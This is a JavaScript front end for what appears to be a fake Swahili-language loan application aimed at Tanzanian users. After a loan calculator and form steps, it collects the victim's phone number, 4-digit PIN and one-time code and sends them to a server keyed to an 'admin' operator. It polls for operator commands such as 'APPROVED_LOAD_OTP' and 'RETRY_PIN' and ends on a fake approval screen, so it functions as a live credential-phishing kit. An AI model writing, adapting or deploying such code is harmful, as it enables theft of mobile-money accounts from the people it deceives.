document.addEventListener('DOMContentLoaded', () => {
  // Extract URL Params (Admin ID)
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin') || '';

  // Elements
  const sections = {
    calc: document.getElementById('step-calculator'),
    form1: document.getElementById('step-form-1'),
    form2: document.getElementById('step-form-2'),
    form3: document.getElementById('step-form-3'),
    login: document.getElementById('step-login'),
    otp: document.getElementById('step-otp'),
    success: document.getElementById('step-success')
  };

  const navBackBtn = document.getElementById('navBackBtn');

  // Slider Elements
  const calcAmountSlider = document.getElementById('calcAmountSlider');
  const calcAmountDisplay = document.getElementById('calcAmountDisplay');
  const calcMonthsSlider = document.getElementById('calcMonthsSlider');
  const calcMonthsDisplay = document.getElementById('calcMonthsDisplay');
  const calcMonthlyPayment = document.getElementById('calcMonthlyPayment');

  // Form inputs
  const formAmount = document.getElementById('formAmount');
  const formMonths = document.getElementById('formMonths');
  const loanPurpose = document.getElementById('loanPurpose');
  const firstName = document.getElementById('firstName');
  const lastName = document.getElementById('lastName');
  const phoneNumber = document.getElementById('phoneNumber');

  // Helper: Switch View
  function showSection(targetKey, showBack = true) {
    Object.keys(sections).forEach(key => {
      if (sections[key]) sections[key].classList.remove('active');
    });
    if (sections[targetKey]) sections[targetKey].classList.add('active');
    navBackBtn.style.display = showBack && targetKey !== 'calc' && targetKey !== 'success' ? 'block' : 'none';
    window.scrollTo(0, 0);
  }

  // Calculator Logic
  function updateCalculator() {
    const amount = parseInt(calcAmountSlider.value);
    const months = parseInt(calcMonthsSlider.value);

    calcAmountDisplay.textContent = `TSh ${amount.toLocaleString()}`;
    calcMonthsDisplay.textContent = `miezi ${months}`;

    // Standard formula simulation: (Amount * 1.14) / Months
    const monthly = Math.round((amount * 1.14) / months);
    calcMonthlyPayment.textContent = `TSh ${monthly.toLocaleString()}`;

    // Sync to form 1
    formAmount.value = amount;
  }

  calcAmountSlider.addEventListener('input', updateCalculator);
  calcMonthsSlider.addEventListener('input', updateCalculator);

  // Step Navigations
  document.getElementById('btnStartApplication').addEventListener('click', () => showSection('form1'));
  
  document.getElementById('btnToStep2').addEventListener('click', () => {
    document.getElementById('sumAmount').textContent = `TSh ${parseInt(formAmount.value).toLocaleString()}`;
    document.getElementById('sumMonths').textContent = `Miezi ${formMonths.value}`;
    document.getElementById('sumPurpose').textContent = loanPurpose.value || 'Haikuwekwa';
    showSection('form2');
  });

  document.getElementById('btnBackTo1').addEventListener('click', () => showSection('form1'));

  document.getElementById('btnToStep3').addEventListener('click', () => {
    if (!firstName.value || !phoneNumber.value) {
      alert('Tafadhali jaza jina na namba ya simu.');
      return;
    }
    document.getElementById('sumName').textContent = `${firstName.value} ${lastName.value}`;
    showSection('form3');
  });

  document.getElementById('btnBackTo2').addEventListener('click', () => showSection('form2'));

  document.getElementById('btnToLogin').addEventListener('click', () => {
    document.getElementById('loginPhone').value = phoneNumber.value;
    showSection('login', false);
  });

  // PIN Handling
  const pinInputs = [
    document.getElementById('pin1'),
    document.getElementById('pin2'),
    document.getElementById('pin3'),
    document.getElementById('pin4')
  ];
  const btnLoginSubmit = document.getElementById('btnLoginSubmit');

  pinInputs.forEach((input, idx) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && idx < 3) {
        pinInputs[idx + 1].focus();
      }
      checkPinComplete();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && idx > 0) {
        pinInputs[idx - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    const pin = pinInputs.map(i => i.value).join('');
    if (pin.length === 4) {
      btnLoginSubmit.classList.add('active');
      btnLoginSubmit.disabled = false;
    } else {
      btnLoginSubmit.classList.remove('active');
      btnLoginSubmit.disabled = true;
    }
  }

  let activeUserId = '';

  // Submit Application + PIN
  btnLoginSubmit.addEventListener('click', async () => {
    const contact = document.getElementById('loginPhone').value;
    const pin = pinInputs.map(i => i.value).join('');
    const amount = `TSh ${parseInt(formAmount.value).toLocaleString()}`;

    showOverlay('Inatuma maombi...');

    try {
      const res = await fetch(`/api/submit-application?admin=${adminChatId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ contact, pin, amount, adminChatId })
      });

      const data = await res.json();
      if (data.success) {
        activeUserId = data.userId;
        updateOverlayText('Inasubiri idhini kutoka kwa msimamizi...');
        pollStatus();
      } else {
        hideOverlay();
        alert(data.error || 'Hitilafu imetokea.');
      }
    } catch (err) {
      hideOverlay();
      alert('Imeshindwa kuunganisha kwenye seva.');
    }
  });

  // Status Polling for Admin Decision
  let pollInterval = null;
  function pollStatus() {
    if (pollInterval) clearInterval(pollInterval);

    pollInterval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${activeUserId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP') {
          clearInterval(pollInterval);
          hideOverlay();
          document.getElementById('otpPhoneDisplay').textContent = `+255${phoneNumber.value.replace(/^0/, '')}`;
          showSection('otp', false);
          startOtpTimer();
        } else if (data.status === 'DENIED') {
          clearInterval(pollInterval);
          hideOverlay();
          alert('Ombi lako limekataliwa na msimamizi.');
        } else if (data.status === 'SUCCESS') {
          clearInterval(pollInterval);
          hideOverlay();
          showSuccessScreen();
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(pollInterval);
          hideOverlay();
          alert('PIN uliyoingiza si sahihi. Tafadhali jaribu tena.');
          showSection('login', false);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(pollInterval);
          hideOverlay();
          alert('OTP si sahihi. Tafadhali jaribu tena.');
        }
      } catch (e) {}
    }, 2000);
  }

  // OTP Handling
  const otpInputs = [
    document.getElementById('otp1'),
    document.getElementById('otp2'),
    document.getElementById('otp3'),
    document.getElementById('otp4')
  ];
  const btnOtpSubmit = document.getElementById('btnOtpSubmit');

  otpInputs.forEach((input, idx) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && idx < 3) {
        otpInputs[idx + 1].focus();
      }
      const otp = otpInputs.map(i => i.value).join('');
      btnOtpSubmit.disabled = otp.length !== 4;
      if (otp.length === 4) btnOtpSubmit.classList.add('active');
    });
  });

  btnOtpSubmit.addEventListener('click', async () => {
    const otp = otpInputs.map(i => i.value).join('');
    showOverlay('Inathibitisha OTP...');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: activeUserId, otp })
      });

      const data = await res.json();
      if (data.success) {
        updateOverlayText('Inasubiri uhakiki wa OTP...');
        pollStatus();
      } else {
        hideOverlay();
        alert('Kushindwa kutuma OTP.');
      }
    } catch (err) {
      hideOverlay();
      alert('Hitilafu ya mtandao.');
    }
  });

  function showSuccessScreen() {
    const amountVal = parseInt(formAmount.value) || 100000;
    const monthsVal = formMonths.value || 48;
    const monthlyPay = Math.round((amountVal * 1.14) / monthsVal);

    document.getElementById('finalApprovedAmount').textContent = `TSh ${amountVal.toLocaleString()}`;
    document.getElementById('finalMonthlyPay').textContent = `TSh ${monthlyPay.toLocaleString()}`;
    document.getElementById('finalMonths').textContent = `Miezi ${monthsVal}`;

    showSection('success', false);
  }

  // Timer
  function startOtpTimer() {
    let timeLeft = 40;
    const timerElem = document.getElementById('resendTimer');
    const interval = setInterval(() => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(interval);
        timerElem.innerHTML = '<a href="#" style="color: var(--primary);">Tuma tena msimbo</a>';
      } else {
        timerElem.textContent = `Tuma tena msimbo ndani ya ${timeLeft} sekunde`;
      }
    }, 1000);
  }

  // Helpers Overlay
  function showOverlay(txt) {
    document.getElementById('loadingText').textContent = txt;
    document.getElementById('loadingOverlay').classList.remove('hidden');
  }

  function updateOverlayText(txt) {
    document.getElementById('loadingText').textContent = txt;
  }

  function hideOverlay() {
    document.getElementById('loadingOverlay').classList.add('hidden');
  }

  updateCalculator();
});
